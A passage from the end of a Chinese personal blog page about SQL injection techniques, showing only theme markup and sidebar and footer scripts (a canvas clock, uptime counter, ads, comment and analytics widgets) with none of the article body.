class="nav-text">SQL注入进阶</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%97%B6%E9%97%B4%E6%B3%A8%E5%85%A5"><span class="nav-text">时间注入</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%8A%80%E6%9C%AF"><span class="nav-text">SQL注入绕过技术</span></a></li></ol></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="IdeFun"
      src="https://i.loli.net/2021/01/05/Gf1qZ9szBp7tISF.jpg">
  <p class="site-author-name" itemprop="name">IdeFun</p>
  <div class="site-description" itemprop="description">IdeFun的小破站,记录生活,分享知识</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">41</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">18</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">31</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/wxpsjhhd" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;wxpsjhhd" rel="noopener external nofollow noreferrer" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
  </div>




<div style="">
  <canvas id="canvas" style="width:60%;"> 当前浏览器不支持 canvas，请更换浏览器后再试 </canvas>
</div>
<script>
(function(){

   var digit=
    [
        [
            [0,0,1,1,1,0,0],
            [0,1,1,0,1,1,0],
            [1,1,0,0,0,1,1],
            [1,1,0,0,0,1,1],
            [1,1,0,0,0,1,1],
            [1,1,0,0,0,1,1],
            [1,1,0,0,0,1,1],
            [1,1,0,0,0,1,1],
            [0,1,1,0,1,1,0],
            [0,0,1,1,1,0,0]
        ],//0
        [
            [0,0,0,1,1,0,0],
            [0,1,1,1,1,0,0],
            [0,0,0,1,1,0,0],
            [0,0,0,1,1,0,0],
            [0,0,0,1,1,0,0],
            [0,0,0,1,1,0,0],
            [0,0,0,1,1,0,0],
            [0,0,0,1,1,0,0],
            [0,0,0,1,1,0,0],
            [1,1,1,1,1,1,1]
        ],//1
        [
            [0,1,1,1,1,1,0],
            [1,1,0,0,0,1,1],
            [0,0,0,0,0,1,1],
            [0,0,0,0,1,1,0],
            [0,0,0,1,1,0,0],
            [0,0,1,1,0,0,0],
            [0,1,1,0,0,0,0],
            [1,1,0,0,0,0,0],
            [1,1,0,0,0,1,1],
            [1,1,1,1,1,1,1]
        ],//2
        [
            [1,1,1,1,1,1,1],
            [0,0,0,0,0,1,1],
            [0,0,0,0,1,1,0],
            [0,0,0,1,1,0,0],
            [0,0,1,1,1,0,0],
            [0,0,0,0,1,1,0],
            [0,0,0,0,0,1,1],
            [0,0,0,0,0,1,1],
            [1,1,0,0,0,1,1],
            [0,1,1,1,1,1,0]
        ],//3
        [
            [0,0,0,0,1,1,0],
            [0,0,0,1,1,1,0],
            [0,0,1,1,1,1,0],
            [0,1,1,0,1,1,0],
            [1,1,0,0,1,1,0],
            [1,1,1,1,1,1,1],
            [0,0,0,0,1,1,0],
            [0,0,0,0,1,1,0],
            [0,0,0,0,1,1,0],
            [0,0,0,1,1,1,1]
        ],//4
        [
            [1,1,1,1,1,1,1],
            [1,1,0,0,0,0,0],
            [1,1,0,0,0,0,0],
            [1,1,1,1,1,1,0],
            [0,0,0,0,0,1,1],
            [0,0,0,0,0,1,1],
            [0,0,0,0,0,1,1],
            [0,0,0,0,0,1,1],
            [1,1,0,0,0,1,1],
            [0,1,1,1,1,1,0]
        ],//5
        [
            [0,0,0,0,1,1,0],
            [0,0,1,1,0,0,0],
            [0,1,1,0,0,0,0],
            [1,1,0,0,0,0,0],
            [1,1,0,1,1,1,0],
            [1,1,0,0,0,1,1],
            [1,1,0,0,0,1,1],
            [1,1,0,0,0,1,1],
            [1,1,0,0,0,1,1],
            [0,1,1,1,1,1,0]
        ],//6
        [
            [1,1,1,1,1,1,1],
            [1,1,0,0,0,1,1],
            [0,0,0,0,1,1,0],
            [0,0,0,0,1,1,0],
            [0,0,0,1,1,0,0],
            [0,0,0,1,1,0,0],
            [0,0,1,1,0,0,0],
            [0,0,1,1,0,0,0],
            [0,0,1,1,0,0,0],
            [0,0,1,1,0,0,0]
        ],//7
        [
            [0,1,1,1,1,1,0],
            [1,1,0,0,0,1,1],
            [1,1,0,0,0,1,1],
            [1,1,0,0,0,1,1],
            [0,1,1,1,1,1,0],
            [1,1,0,0,0,1,1],
            [1,1,0,0,0,1,1],
            [1,1,0,0,0,1,1],
            [1,1,0,0,0,1,1],
            [0,1,1,1,1,1,0]
        ],//8
        [
            [0,1,1,1,1,1,0],
            [1,1,0,0,0,1,1],
            [1,1,0,0,0,1,1],
            [1,1,0,0,0,1,1],
            [0,1,1,1,0,1,1],
            [0,0,0,0,0,1,1],
            [0,0,0,0,0,1,1],
            [0,0,0,0,1,1,0],
            [0,0,0,1,1,0,0],
            [0,1,1,0,0,0,0]
        ],//9
        [
            [0,0,0,0,0,0,0],
            [0,0,1,1,1,0,0],
            [0,0,1,1,1,0,0],
            [0,0,1,1,1,0,0],
            [0,0,0,0,0,0,0],
            [0,0,0,0,0,0,0],
            [0,0,1,1,1,0,0],
            [0,0,1,1,1,0,0],
            [0,0,1,1,1,0,0],
            [0,0,0,0,0,0,0]
        ]//:
    ];

var canvas = document.getElementById('canvas');

if(canvas.getContext){
    var cxt = canvas.getContext('2d');
    // 声明 canvas 的宽高 
    var H = 100,W = 700;
    canvas.height = H;
    canvas.width = W;
    cxt.fillStyle = '#f00';
    cxt.fillRect(10,10,50,50);

    // 存储时间数据 
    var data = [];
    // 存储运动的小球 
    var balls = [];
    // 设置粒子半径 
    var R = canvas.height/20-1;
    (function(){
        var temp = /(\d)(\d):(\d)(\d):(\d)(\d)/.exec(new Date());
        // 存储时间数字，由十位小时、个位小时、冒号、十位分钟、个位分钟、冒号、十位秒钟、个位秒钟这 7 个数字组成 
        data.push(temp[1],temp[2],10,temp[3],temp[4],10,temp[5],temp[6]);
    })();

    /* 生成点阵数字 */
    function renderDigit(index,num){
        for(var i = 0; i < digit[num].length; i++){
            for(var j = 0; j < digit[num][i].length; j++){
                if(digit[num][i][j] == 1){
                    cxt.beginPath();
                    //cxt.fillStyle = '#f00';/* 红色数字 */
                    cxt.fillStyle = '#6ce2f2';/* 白色数字 */
                    //cxt.fillStyle = '#FAF0BB';/* 代码黄数字 */
                    cxt.arc(14*(R+2)*index + j*2*(R+1)+(R+1),i*2*(R+1)+(R+1),R,0,2*Math.PI);
                    cxt.closePath();
                    cxt.fill();
                }
            }
        }
    }

    /* 更新时钟 */
    function updateDigitTime(){
        var changeNumArray = [];
        var temp = /(\d)(\d):(\d)(\d):(\d)(\d)/.exec(new Date());
        var NewData = [];
        NewData.push(temp[1],temp[2],10,temp[3],temp[4],10,temp[5],temp[6]);
        for(var i = data.length-1; i >=0 ; i--){
            // 时间发生变化 
            if(NewData[i] !== data[i]){
                // 将变化的数字值和在 data 数组中的索引存储在 changeNumArray 数组中 
                changeNumArray.push(i+'_'+(Number(data[i])+1)%10);
            }
        }
        // 增加小球 
        for(var i = 0; i< changeNumArray.length; i++){
            addBalls.apply(this,changeNumArray[i].split('_'));
        }
        data = NewData.concat();
    }

    /* 更新小球状态 */
    function updateBalls(){
        for(var i = 0; i < balls.length; i++){
            balls[i].stepY += balls[i].disY;
            balls[i].x += balls[i].stepX;
            balls[i].y += balls[i].stepY;
            if(balls[i].x > W + R || balls[i].y > H + R){
                balls.splice(i,1);
                i--;
            }
        }
    }

    /* 增加要运动的小球 */
    function addBalls(index,num){
        var numArray = [1,2,3];
        var colorArray =  ["#3BE","#09C","#A6C","#93C","#9C0","#690","#FB3","#F80","#F44","#C00"];
        for(var i = 0; i < digit[num].length; i++){
            for(var j = 0; j < digit[num][i].length; j++){
                if(digit[num][i][j] == 1){
                    var ball = {
                        x:14*(R+2)*index + j*2*(R+1)+(R+1),
                        y:i*2*(R+1)+(R+1),
                        stepX:Math.floor(Math.random() * 4 -2),
                        stepY:-2*numArray[Math.floor(Math.random()*numArray.length)],
                        color:colorArray[Math.floor(Math.random()*colorArray.length)],
                        disY:1
                    };
                    balls.push(ball);
                }
            }
        }
    }

    /* 渲染 */
    function render(){
        // 重置画布宽度，达到清空画布的效果 
        canvas.height = 100;
        // 渲染时钟 
        for(var i = 0; i < data.length; i++){
            renderDigit(i,data[i]);
        }
        // 渲染小球 
        for(var i = 0; i < balls.length; i++){
            cxt.beginPath();
            cxt.arc(balls[i].x,balls[i].y,R,0,2*Math.PI);
            cxt.fillStyle = balls[i].color;
            cxt.closePath();
            cxt.fill();
        }
    }

    clearInterval(oTimer);
    var oTimer = setInterval(function(){
        // 更新时钟 
        updateDigitTime();
        // 更新小球状态 
        updateBalls();
        // 渲染 
        render();
    },50);
}

})();
</script>





  <div class="links-of-recent-posts motion-element">
    <div class="links-of-recent-posts-title">
      <i class="fa fa-history fa-fw"></i>
      最近文章
    </div>
    <ul class="links-of-recent-posts-list">
        <li class="links-of-recent-posts-item">
          <a href="/article/cfda4bcb.html" title="article&#x2F;cfda4bcb.html">初级算法</a>
        </li>
        <li class="links-of-recent-posts-item">
          <a href="/article/8240bef7.html" title="article&#x2F;8240bef7.html">渗透测试实战指南</a>
        </li>
        <li class="links-of-recent-posts-item">
          <a href="/article/44a199f9.html" title="article&#x2F;44a199f9.html">Nmap的使用</a>
        </li>
    </ul>
  </div>
      </div>
      <div id="days"></div>
</script>
<script language="javascript">
function show_date_time(){
window.setTimeout("show_date_time()", 1000);
BirthDay=new Date("01/01/2021 20:00:00");
today=new Date();
timeold=(today.getTime()-BirthDay.getTime());
sectimeold=timeold/1000
secondsold=Math.floor(sectimeold);
msPerDay=24*60*60*1000
e_daysold=timeold/msPerDay
daysold=Math.floor(e_daysold);
e_hrsold=(e_daysold-daysold)*24;
hrsold=setzero(Math.floor(e_hrsold));
e_minsold=(e_hrsold-hrsold)*60;
minsold=setzero(Math.floor((e_hrsold-hrsold)*60));
seconds=setzero(Math.floor((e_minsold-minsold)*60));
document.getElementById('days').innerHTML="已运行"+daysold+"天"+hrsold+"时"+minsold+"分"+seconds+"秒";
}
function setzero(i){
if (i<10)
{i="0" + i};
return i;
}
show_date_time();
</script>
      <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
      <!-- getmoney -->
      <ins class="adsbygoogle"
          style="display:block"
          data-ad-client="ca-pub-8879606278129720"
          data-ad-slot="1549628428"
          data-ad-format="auto"
          data-full-width-responsive="true"></ins>
      <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
      </script>
    </div>

  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">IdeFun</span>
</div>

<div class="translate-style">
繁/简：<a id="translateLink" href="javascript:translatePage();" rel="external nofollow noreferrer">繁体
</a>
</div>
<script type="text/javascript" src="/js/tw_cn.js"></script>
<script type="text/javascript">
var defaultEncoding = 2; //网站编写字体是否繁体，1-繁体，2-简体
var translateDelay = 0; //延迟时间,若不在前, 要设定延迟翻译时间, 如100表示100ms,默认为0
var cookieDomain = "https://blog.idefun.com/"; //Cookie地址, 一定要设定, 通常为你的网址
var msgToTraditionalChinese = "繁体"; //此处可以更改为你想要显示的文字
var msgToSimplifiedChinese = "简体"; //同上，但两处均不建议更改
var translateButtonId = "translateLink"; //默认互换id
translateInitilization();
</script>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>


  <script defer src="/lib/three/three.min.js"></script>


  
  <script>
    (function(){
      var canonicalURL, curProtocol;
      //Get the <link> tag
      var x=document.getElementsByTagName("link");
		//Find the last canonical URL
		if(x.length > 0){
			for (i=0;i<x.length;i++){
				if(x[i].rel.toLowerCase() == 'canonical' && x[i].href){
					canonicalURL=x[i].href;
				}
			}
		}
    //Get protocol
	    if (!canonicalURL){
	    	curProtocol = window.location.protocol.split(':')[0];
	    }
	    else{
	    	curProtocol = canonicalURL.split(':')[0];
	    }
      //Get current URL if the canonical URL does not exist
	    if (!canonicalURL) canonicalURL = window.location.href;
	    //Assign script content. Replace current URL with the canonical URL
      !function(){var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,r=canonicalURL,t=document.referrer;if(!e.test(r)){var n=(String(curProtocol).toLowerCase() === 'https')?"https://sp0.baidu.com/9_Q4simg2RQJ8t7jm9iCKT-xh_/s.gif":"//api.share.baidu.com/s.gif";t?(n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)):r&&(n+="?l="+r);var i=new Image;i.src=n}}(window);})();
  </script>



  <script>
  if (CONFIG.page.isPost) {
    wpac_init = window.wpac_init || [];
    wpac_init.push({
      widget: 'Rating',
      id    : 28855,
      el    : 'wpac-rating',
      color : 'fc6423'
    });
    (function() {
      if ('WIDGETPACK_LOADED' in window) return;
      WIDGETPACK_LOADED = true;
      var mc = document.createElement('script');
      mc.type = 'text/javascript';
      mc.async = true;
      mc.src = '//embed.widgetpack.com/widget.js';
      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(mc, s.nextSibling);
    })();
  }
  </script>

  
<script src="/js/local-search.js"></script>






  <script src="//code.tidio.co/63puqgsrscxyzgqbosntsv6ezkbqgoiq.js"></script>







  

  
      

<script>
  if (typeof MathJax === 'undefined') {
    window.MathJax = {
      loader: {
        source: {
          '[tex]/amsCd': '[tex]/amscd',
          '[tex]/AMScd': '[tex]/amscd'
        }
      },
      tex: {
        inlineMath: {'[+]': [['$', '$']]},
        tags: 'ams'
      },
      options: {
        renderActions: {
          findScript: [10, doc => {
            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
              const display = !!node.type.match(/; *mode=display/);
              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
              const text = document.createTextNode('');
              node.parentNode.replaceChild(text, node);
              math.start = {node: text, delim: '', n: 0};
              math.end = {node: text, delim: '', n: 0};
              doc.math.push(math);
            });
          }, '', false],
          insertedScript: [200, () => {
            document.querySelectorAll('mjx-container').forEach(node => {
              let target = node.parentNode;
              if (target.nodeName.toLowerCase() === 'li') {
                target.parentNode.classList.add('has-jax');
              }
            });
          }, '', false]
        }
      }
    };
    (function () {
      var script = document.createElement('script');
      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
      script.defer = true;
      document.head.appendChild(script);
    })();
  } else {
    MathJax.startup.document.state(0);
    MathJax.texReset();
    MathJax.typeset();
  }
</script>

    

  


<script>
NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
    var GUEST = ['nick', 'mail', 'link'];
    var guest = 'nick,mail,link';
    guest = guest.split(',').filter(item => {
      return GUEST.includes(item);
    });
    new Valine({
      el         : '#valine-comments',
      verify     : false,
      notify     : false,
      appId      : '3k1pRldiEm5Bav29gwwSR0Xs-MdYXbMMI',
      appKey     : 'sh1CkfaV42luCnQN7TosRDtc',
      placeholder: "来都来了，不撩一句嘛~，留言记得在上面留下【邮箱】，方便收到回复通知~",
      avatar     : 'wavatar',
      meta       : guest,
      pageSize   : '10' || 10,
      visitor    : false,
      lang       : 'zh-CN' || 'zh-cn',
      path       : location.pathname,
      recordIP   : true,
      serverURLs : ''
    });
  }, window.Valine);
});
</script>

  <script type="text/javascript" src="/js/src/linkcard.js"></script>
   
<script>
  var OriginTitile = document.title;
  var titleTime;
  document.addEventListener("visibilitychange", function() {
    if (document.hidden) {
      document.title = "(つェ⊂)我藏好了哦~" + OriginTitile;
      clearTimeout(titleTime);
    } else {
      document.title = "(*´∇｀*) 被你发现啦~" + OriginTitile;
      titleTime = setTimeout(function() {
        document.title = OriginTitile;
      }, 2000);
    }
  });
</script>

  <!-- calendar widget -->

    <script src="/lib/calendar/calendar.min.js"></script>
    <script src="/lib/calendar/languages.min.js"></script>
    <script type="text/javascript">
    $(function() {
        $('#CloudCalendar').aCalendar('zh-CN',
            $.extend(
                '', {
                    single:true,
                    root:'/calendar/'
                }
            )
        );
    });
    </script>


</body>
</html>
